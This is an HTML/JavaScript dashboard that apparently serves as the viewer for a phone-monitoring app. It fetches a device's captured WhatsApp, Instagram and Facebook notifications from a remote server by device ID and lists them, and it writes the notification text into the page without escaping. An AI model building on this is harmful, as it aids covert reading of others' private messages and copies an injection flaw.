<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Notification Log</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
:root{
    --bg:#0f0f0f;
    --glass:rgba(255,255,255,.08);
    --border:rgba(255,255,255,.15);
    --cyan:#00f3ff;
}

*{box-sizing:border-box;}

body{
    margin:0;
    min-height:100vh;
    background:linear-gradient(45deg,#050505,#151515);
    display:flex;
    justify-content:center;
    align-items:center;
    font-family:Segoe UI,sans-serif;
    color:#fff;
}

.container{
    width:100%;
    max-width:450px;
    height:85vh;
    background:rgba(0,0,0,.6);
    border-radius:30px;
    border:1px solid var(--border);
    padding:20px;

    display:flex;
    flex-direction:column;
    overflow:hidden; /* ðŸ”´ MOST IMPORTANT */
}

/* HEADER */
.header{
    display:flex;
    justify-content:space-between;
    align-items:center;
    padding-bottom:15px;
    border-bottom:1px solid var(--border);
    flex-shrink:0;
}

.page-title{
    color:var(--cyan);
    font-weight:bold;
    letter-spacing:1px;
}

/* FILTERS */
.filter-row{
    display:flex;
    gap:10px;
    margin:15px 0;
    overflow-x:auto;
    flex-shrink:0;
}
.filter-row::-webkit-scrollbar{display:none;}

.filter-btn{
    background:var(--glass);
    border:1px solid var(--border);
    color:#aaa;
    padding:6px 15px;
    border-radius:20px;
    font-size:.75rem;
    cursor:pointer;
    white-space:nowrap;
}
.filter-btn.active{
    border-color:var(--cyan);
    color:#fff;
}

/* ðŸ”´ SCROLL AREA */
.notif-list{
    flex:1;                 /* ðŸ”¥ take remaining space */
    min-height:0;           /* ðŸ”¥ allow scrolling */
    overflow-y:auto;
    padding-right:5px;
    -webkit-overflow-scrolling:touch;
}

/* SCROLLBAR */
.notif-list::-webkit-scrollbar{width:6px;}
.notif-list::-webkit-scrollbar-thumb{
    background:#333;
    border-radius:10px;
}

/* CARD */
.notif-card{
    background:var(--glass);
    border:1px solid var(--border);
    border-radius:12px;
    padding:12px;
    display:flex;
    gap:12px;
    margin-bottom:10px;
}

.app-icon{
    width:36px;
    height:36px;
    border-radius:10px;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:1.1rem;
    flex-shrink:0;
}

.notif-content{flex:1;min-width:0;}

.top-row{
    display:flex;
    justify-content:space-between;
}

.app-name{
    font-size:.65rem;
    color:var(--cyan);
    font-weight:bold;
}

.time-badge{
    font-size:.6rem;
    color:#aaa;
}

.notif-title{
    font-size:.9rem;
    font-weight:bold;
    white-space:nowrap;
    overflow:hidden;
    text-overflow:ellipsis;
}

.notif-text{
    font-size:.8rem;
    color:#ccc;
    line-height:1.3;
}

/* COLORS */
.whatsapp{background:rgba(37,211,102,.15);color:#25d366;border:1px solid #25d366;}
.instagram{background:rgba(193,53,132,.15);color:#c13584;border:1px solid #c13584;}
.facebook{background:rgba(24,119,242,.15);color:#1877f2;border:1px solid #1877f2;}
.system{background:rgba(255,255,255,.1);border:1px solid #fff;}
</style>
      
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
            <span class="page-title">Notification Log</span>
            <div onclick="loadNotifications()" style="cursor: pointer; color: var(--cyan); font-size: 1.2rem;">
                <i class="fa-solid fa-rotate"></i>
            </div>
        </div>

        <div class="filter-row">
            <button class="filter-btn active" onclick="filterList('all', this)">All</button>
            <button class="filter-btn" onclick="filterList('whatsapp', this)">WhatsApp</button>
            <button class="filter-btn" onclick="filterList('instagram', this)">Instagram</button>
            <button class="filter-btn" onclick="filterList('facebook', this)">Facebook</button>
            <button class="filter-btn" onclick="filterList('other', this)">Others</button>
        </div>

        <div class="notif-list" id="notifContainer">
            <div class="status-msg">
                <i class="fa-solid fa-spinner fa-spin fa-2x"></i><br><br>
                Connecting...
            </div>
        </div>
    </div>

    <script>
        const API_BASE = 'https://child-v9no.onrender.com';
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');

        let allNotifications = []; 

        window.onload = () => {
            if(!DEVICE_ID) {
                document.getElementById('notifContainer').innerHTML = "<p class='status-msg'>ID Missing!</p>";
                return;
            }
            loadNotifications();
        };

        async function loadNotifications() {
            const container = document.getElementById("notifContainer");
            container.innerHTML = "<div class='status-msg'><i class='fa-solid fa-spinner fa-spin'></i> Syncing...</div>";

            try {
                const response = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/notifications?t=${Date.now()}`);
                const data = await response.json();

                if (!data || data.length === 0) {
                    container.innerHTML = "<p class='status-msg'>No notifications yet.</p>";
                    return;
                }

                // ðŸ”´ IMPORTANT CHANGE: Sorting by Time (Newest First)
                // b.postTime - a.postTime ka matlab hai jiska time bada (naya) hai wo pehle aayega.
                allNotifications = data.sort((a, b) => b.postTime - a.postTime);
                
                renderList(allNotifications);

            } catch (err) {
                console.error(err);
                container.innerHTML = "<p class='status-msg' style='color:#ff4444'>Offline / Error</p>";
            }
        }

        function renderList(data) {
            const container = document.getElementById("notifContainer");
            container.innerHTML = "";

            if(data.length === 0) {
                container.innerHTML = "<p class='status-msg'>Empty List</p>";
                return;
            }

            data.forEach(item => {
                const app = getAppDetails(item.packageName);
                const timeStr = new Date(parseInt(item.postTime)).toLocaleString([], { hour: '2-digit', minute:'2-digit', day:'numeric', month:'short' });

                const card = document.createElement("div");
                card.className = "notif-card";
                card.innerHTML = `
                    <div class="app-icon ${app.style}">
                        <i class="${app.icon}"></i>
                    </div>
                    <div class="notif-content">
                        <div class="top-row">
                            <span class="app-name">${app.name}</span>
                            <span class="time-badge">${timeStr}</span>
                        </div>
                        <div class="notif-title">${item.title || 'Notification'}</div>
                        <div class="notif-text">${item.text || ''}</div>
                    </div>
                `;
                container.appendChild(card);
            });
        }

        function getAppDetails(pkg) {
            pkg = (pkg || "").toLowerCase();
            if (pkg.includes("whatsapp")) return { name: "WhatsApp", icon: "fa-brands fa-whatsapp", style: "whatsapp" };
            if (pkg.includes("instagram")) return { name: "Instagram", icon: "fa-brands fa-instagram", style: "instagram" };
            if (pkg.includes("facebook")) return { name: "Facebook", icon: "fa-brands fa-facebook-f", style: "facebook" };
            return { name: "System", icon: "fa-solid fa-bell", style: "system" };
        }

        function filterList(type, btn) {
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            if (type === 'all') {
                renderList(allNotifications);
            } else if (type === 'other') {
                renderList(allNotifications.filter(n => {
                    const p = (n.packageName || "").toLowerCase();
                    return !p.includes("whatsapp") && !p.includes("instagram") && !p.includes("facebook");
                }));
            } else {
                renderList(allNotifications.filter(n => (n.packageName || "").toLowerCase().includes(type)));
            }
        }
    </script>
</body>
</html>

